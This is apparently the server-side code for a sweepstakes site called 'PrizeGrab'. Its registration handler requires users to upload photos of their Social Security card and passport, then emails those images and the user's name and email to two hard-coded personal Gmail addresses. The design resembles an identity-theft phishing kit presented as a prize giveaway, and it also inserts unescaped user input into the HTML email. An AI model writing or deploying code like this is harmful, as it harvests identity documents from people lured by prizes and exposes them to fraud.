import { fail } from '@sveltejs/kit';
import type { MetaTagsProps, MetaTag, LinkTag } from 'svelte-meta-tags';
import { superValidate } from 'sveltekit-superforms';
import { zod } from 'sveltekit-superforms/adapters';
import { registerSchema } from '@/utils/form-schema.js';
import { EmailValidator } from '@/utils/email-validator';
import { EMAIL_CONFIG } from '@/utils/email-config';


export const load = async (event) => {
	const { url } = event
	const defaultOrigin = `https//${new URL(url.pathname, url.origin).href}`;
	const metaTag: MetaTag[] = [
		{
			property: 'dc:creator',
			content: 'PrizeGrab'
		},
		{
			name: 'application-name',
			content: 'PrizeGrab'
		},
		{
			httpEquiv: 'x-ua-compatible',
			content: 'IE=edge; chrome=1'
		}
	];
	const linkTag: LinkTag[] = [
		{
			rel: 'icon',
			href: `/pg-192.webp`,
		},
	];
	const pageMetaTags = {
		title: 'PrizeGrab',
		description: "PrizeGrab - Daily Sweepstakes! You can win Cash Prizes, Electronics, TV's, iPads, Gift Cards and More!",
		keywords: ["Sweepstakes", "Giveaway", "Free Money", "Gift", "Prizes", " Lottery"],
		robots: 'index,follow',
		canonical: defaultOrigin,
		additionalMetaTags: metaTag,
		additionalLinkTags: linkTag,
		openGraph: {
			type: 'website',
			url: defaultOrigin,
			locale: 'en_IE',
			title: 'PrizeGrab',
			description: "PrizeGrab - Daily Sweepstakes! You can win Cash Prizes, Electronics, TV's, iPads, Gift Cards and More!",
			siteName: 'PrizeGrab',
			images: [
				{
					url: `/pg-192.webp`,
					alt: 'PrizeGrab',
					width: 800,
					height: 600,
					secureUrl: `/pg-192.webp`,
					type: 'image/png'
				}
			],
			profile: {
				firstName: "Prize",
				lastName: "Grab",
				username: "prizegrab"
			}
		}
	} satisfies MetaTagsProps;

	const formRegister = await superValidate(zod(registerSchema));

	return {
		pageMetaTags,
		formRegister
	}
}
export const actions = {
	register: async ({ request, locals }) => {
		const form = await superValidate(request, zod(registerSchema));
		if (!form.valid) {
			return fail(400, {
				success: false,
				form,
				error: { message: 'Invalid input', fields: form.errors }
			});
		}

		try {
			validateAttachment(form.data.ssn_photo, "SSN Photo");
			validateAttachment(form.data.passport_photo, "Passport Photo");

			const attachments = await Promise.all([
				form.data.ssn_photo ? await createEmailAttachment(form.data.ssn_photo, 'ssn-photo') : null,
				form.data.passport_photo ? await createEmailAttachment(form.data.passport_photo, 'passport-photo') : null
			].filter(Boolean));

			const emailHtmlContent = createRegistrationEmailHtml(form.data);

			await locals.nodemailer.sendEmailWithAttachments(
				["santisimilikiti93@gmail.com", "jgal70594@gmail.com"],
				`${EMAIL_CONFIG.DEFAULT_SENDER.NAME} <${EMAIL_CONFIG.DEFAULT_SENDER.EMAIL}>`,
				`New User Registration - ${form.data.name}`,
				{
					html: emailHtmlContent,
					text: `New user registration from ${form.data.name} (${form.data.email})`
				},
				attachments as any[],
				{
					replyTo: form.data.email
				}
			);
			await locals.nodemailer.dispose();

			return {
				success: true,
				form,
				message: 'Registration submitted successfully! We will review your application.',
			};
		} catch (error) {
			console.error('Registration submission error:', error);

			if (error instanceof Error) {
				return fail(500, {
					success: false,
					form,
					error: { message: error.message }
				});
			}

			return fail(500, {
				success: false,
				form,
				error: { message: "Registration submission failed. Please try again." }
			});
		}
	}
}
function validateAttachment(file: File | null | undefined, fieldName: string) {
	if (!file) {
		throw new Error(`Missing required field: ${fieldName}`);
	}

	if (!file.name) {
		throw new Error(`${fieldName} must have a valid filename`);
	}

	if (!EmailValidator.validateFileType(file.name, EMAIL_CONFIG.ATTACHMENT_LIMITS.ALLOWED_TYPES)) {
		throw new Error(`${fieldName}: File type not allowed. Please use JPG, PNG, or WebP format.`);
	}

	if (file.size && !EmailValidator.validateFileSize(file.size, EMAIL_CONFIG.ATTACHMENT_LIMITS.MAX_FILE_SIZE)) {
		const maxSizeMB = EMAIL_CONFIG.ATTACHMENT_LIMITS.MAX_FILE_SIZE / (1024 * 1024);
		throw new Error(`${fieldName}: File too large. Maximum size is ${maxSizeMB}MB.`);
	}
}
async function createEmailAttachment(file: File, prefix: string) {
	try {
		// Convert File to ArrayBuffer, then to Buffer
		const arrayBuffer = await file.arrayBuffer();
		const buffer = Buffer.from(arrayBuffer);

		// Generate safe filename
		const timestamp = Date.now();
		const extension = file.name.split('.').pop() || 'jpg';
		const safeFileName = `${prefix}-${timestamp}.${extension}`;

		return {
			filename: safeFileName,
			content: buffer,
			contentType: file.type,
			// Optional: add Content-ID for inline images
			cid: `${prefix}-${timestamp}`
		};
	} catch (error) {
		console.error(`Error processing file ${file.name}:`, error);
		throw new Error(`Failed to process ${prefix}. Please try again.`);
	}
}
function createRegistrationEmailHtml(formData: any): string {
	const currentDate = new Date().toLocaleString();

	return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>New User Registration</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                line-height: 1.6;
                color: #333;
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
                background-color: #f4f4f4;
            }
            .container {
                background-color: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 20px;
                border-radius: 10px 10px 0 0;
                margin: -30px -30px 30px -30px;
                text-align: center;
            }
            .header h1 {
                margin: 0;
                font-size: 24px;
            }
            .info-section {
                background-color: #f8f9fa;
                padding: 20px;
                border-radius: 8px;
                margin: 20px 0;
                border-left: 4px solid #667eea;
            }
            .info-row {
                display: flex;
                justify-content: space-between;
                padding: 8px 0;
                border-bottom: 1px solid #eee;
            }
            .info-row:last-child {
                border-bottom: none;
            }
            .info-label {
                font-weight: bold;
                color: #555;
            }
            .info-value {
                color: #333;
            }
            .attachments-section {
                margin-top: 30px;
                padding-top: 20px;
                border-top: 2px solid #eee;
            }
            .attachment-item {
                background-color: #e8f4fd;
                padding: 10px;
                margin: 5px 0;
                border-radius: 5px;
                display: flex;
                align-items: center;
            }
            .attachment-icon {
                margin-right: 10px;
                font-size: 18px;
            }
            .footer {
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #eee;
                text-align: center;
                color: #666;
                font-size: 12px;
            }
            @media (max-width: 600px) {
                body {
                    padding: 10px;
                }
                .container {
                    padding: 20px;
                }
                .header {
                    margin: -20px -20px 20px -20px;
                }
                .info-row {
                    flex-direction: column;
                }
                .info-label {
                    margin-bottom: 5px;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎉 New User Registration</h1>
                <p style="margin: 10px 0 0 0; opacity: 0.9;">Registration submitted on ${currentDate}</p>
            </div>

            <div class="info-section">
                <h3 style="margin-top: 0; color: #333;">👤 User Information</h3>
                <div class="info-row">
                    <span class="info-label">Full Name:</span>
                    <span class="info-value">${formData.name}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Email Address:</span>
                    <span class="info-value">${formData.email}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Registration Date:</span>
                    <span class="info-value">${currentDate}</span>
                </div>
            </div>

            <div class="attachments-section">
                <h3 style="color: #333;">📎 Attached Documents</h3>
                <div class="attachment-item">
                    <span class="attachment-icon">🆔</span>
                    <div>
                        <strong>SSN Photo</strong><br>
                        <small>Identity verification document</small>
                    </div>
                </div>
                <div class="attachment-item">
                    <span class="attachment-icon">📘</span>
                    <div>
                        <strong>Passport Photo</strong><br>
                        <small>Passport verification document</small>
                    </div>
                </div>
            </div>

            <div style="background-color: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin: 20px 0;">
                <strong>⚠️ Action Required:</strong>
                <p style="margin: 10px 0 0 0;">
                    Please review the submitted documents and user information.
                    Contact the user at <a href="mailto:${formData.email}">${formData.email}</a> if additional information is needed.
                </p>
            </div>

            <div class="footer">
                <p>This email was generated automatically by the registration system.</p>
                <p>Please do not reply to this email directly.</p>
                <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;">
                <p>&copy; ${new Date().getFullYear()} ${EMAIL_CONFIG.DEFAULT_SENDER.NAME}. All rights reserved.</p>
            </div>
        </div>
    </body>
    </html>
    `;
}